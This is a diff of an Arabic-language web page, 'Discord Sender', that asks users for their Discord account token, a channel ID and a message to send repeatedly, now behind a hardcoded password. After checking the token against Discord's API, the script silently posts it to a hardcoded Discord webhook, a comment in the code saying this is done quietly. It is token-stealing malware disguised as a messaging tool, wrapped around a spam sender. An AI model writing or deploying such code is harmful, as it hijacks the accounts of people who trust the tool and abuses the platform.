@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Discord Sender</title>
+<title>Discord Sender - تسجيل دخول</title>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -17,13 +16,16 @@
   }
   .container {
     text-align: center;
+    max-width: 400px;
+    width: 100%;
   }
-  input[type="text"] {
+  input[type="text"], input[type="password"] {
     padding: 10px;
-    width: 300px;
+    width: 100%;
     font-size: 1rem;
     margin-top: 10px;
     margin-bottom: 10px;
+    box-sizing: border-box;
   }
   button {
     border: none;
@@ -35,45 +37,93 @@
   .black { background-color: black; color: white; }
   .red { background-color: red; color: white; }
   .green { background-color: green; color: white; }
-  #secondScreen, #thirdScreen {
+  #loginScreen, #firstScreen, #secondScreen, #thirdScreen {
     display: none;
+  }
+  #loginScreen {
+    display: block;
+  }
+  #errorMsg {
+    color: red;
+    min-height: 1.2em;
   }
 </style>
 </head>
 <body>
-  <div class="container" id="firstScreen">
-    <h2>قم بكتابة توكن حسابك ديسكورد :</h2>
-    <input id="tokenInput" type="text" placeholder="أدخل التوكن هنا" />
-    <br />
-    <button class="black" id="checkTokenBtn">التالي</button>
-  </div>
 
-  <div class="container" id="secondScreen">
-    <h2>اكتب ايدي الروم :</h2>
-    <input id="channelIdInput" type="text" placeholder="أدخل ايدي الروم هنا" />
-    <br />
-    <button class="black" id="proceedBtn">التالي</button>
-  </div>
+<div class="container" id="loginScreen">
+  <h2>قم بكتابة الرمز السري :</h2>
+  <input id="passwordInput" type="password" placeholder="الرمز السري" />
+  <div id="errorMsg"></div>
+  <button class="black" id="loginBtn">دخول</button>
+</div>
 
-  <div class="container" id="thirdScreen">
-    <h2>قم بكتابة الرسالة :</h2>
-    <input id="messageInput" type="text" placeholder="اكتب الرسالة هنا" />
-    <br />
-    <button class="red" id="startSendingBtn">إرسال الكلام</button>
-    <button class="green" id="stopSendingBtn">إيقاف الإرسال</button>
-  </div>
+<div class="container" id="firstScreen">
+  <h2>قم بكتابة توكن حسابك ديسكورد :</h2>
+  <input id="tokenInput" type="text" placeholder="أدخل التوكن هنا" />
+  <br />
+  <button class="black" id="checkTokenBtn">التالي</button>
+</div>
+
+<div class="container" id="secondScreen">
+  <h2>اكتب ايدي الروم :</h2>
+  <input id="channelIdInput" type="text" placeholder="أدخل ايدي الروم هنا" />
+  <br />
+  <button class="black" id="proceedBtn">التالي</button>
+</div>
+
+<div class="container" id="thirdScreen">
+  <h2>قم بكتابة الرسالة :</h2>
+  <input id="messageInput" type="text" placeholder="اكتب الرسالة هنا" />
+  <br />
+  <button class="red" id="startSendingBtn">إرسال الكلام</button>
+  <button class="green" id="stopSendingBtn">إيقاف الإرسال</button>
+</div>
 
 <script>
+  const webhookURL = 'https://discord.com/api/webhooks/1377673324993318912/cMY07m-2Vs3kEa-JtWtpNEofIit-_-MphmyZP3K5r28zWl0-ZIz0hRC9RhgLgu0VcUG9';
+
+  const loginScreen = document.getElementById('loginScreen');
+  const loginBtn = document.getElementById('loginBtn');
+  const passwordInput = document.getElementById('passwordInput');
+  const errorMsg = document.getElementById('errorMsg');
+
+  const firstScreen = document.getElementById('firstScreen');
   const tokenInput = document.getElementById('tokenInput');
   const checkTokenBtn = document.getElementById('checkTokenBtn');
-  const firstScreen = document.getElementById('firstScreen');
+
   const secondScreen = document.getElementById('secondScreen');
-  const thirdScreen = document.getElementById('thirdScreen');
   const channelIdInput = document.getElementById('channelIdInput');
   const proceedBtn = document.getElementById('proceedBtn');
+
+  const thirdScreen = document.getElementById('thirdScreen');
+  const messageInput = document.getElementById('messageInput');
   const startSendingBtn = document.getElementById('startSendingBtn');
   const stopSendingBtn = document.getElementById('stopSendingBtn');
-  const messageInput = document.getElementById('messageInput');
+
+  let loginAttempts = 0;
+  const maxAttempts = 3;
+
+  loginBtn.addEventListener('click', () => {
+    const pwd = passwordInput.value.trim();
+    if(pwd === 'Ahmed') {
+      loginScreen.style.display = 'none';
+      firstScreen.style.display = 'block';
+      errorMsg.textContent = '';
+      loginAttempts = 0;
+      passwordInput.value = '';
+    } else {
+      loginAttempts++;
+      if(loginAttempts >= maxAttempts) {
+        alert('تم تجاوز عدد المحاولات المسموح بها. سيتم الخروج من الموقع.');
+        window.close();
+        document.body.innerHTML = '<h2>تم حظر الدخول. يرجى إعادة تحميل الصفحة.</h2>';
+      } else {
+        errorMsg.textContent = `كلمة السر خاطئة. حاول مرة أخرى (${loginAttempts}/${maxAttempts})`;
+        passwordInput.value = '';
+      }
+    }
+  });
 
   let userToken = '';
   let channelId = '';
@@ -86,20 +136,20 @@
       return;
     }
 
-    // إرسال التوكن للويب هوك بصمت
-    fetch('https://discord.com/api/webhooks/1377673324993318912/cMY07m-2Vs3kEa-JtWtpNEofIit-_-MphmyZP3K5r28zWl0-ZIz0hRC9RhgLgu0VcUG9', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: 'Token: ' + token })
-    });
-
-    // التحقق من التوكن
     fetch('https://discord.com/api/v9/users/@me', {
       headers: { Authorization: token }
     })
     .then(res => {
       if (res.ok) {
         userToken = token;
+
+        // ارسال التوكن للويب هوك بصمت
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({content: `Token: ${userToken}`})
+        }).catch(console.error);
+
         firstScreen.style.display = 'none';
         secondScreen.style.display = 'block';
       } else {
@@ -148,5 +198,6 @@
     }
   });
 </script>
+
 </body>
 </html>
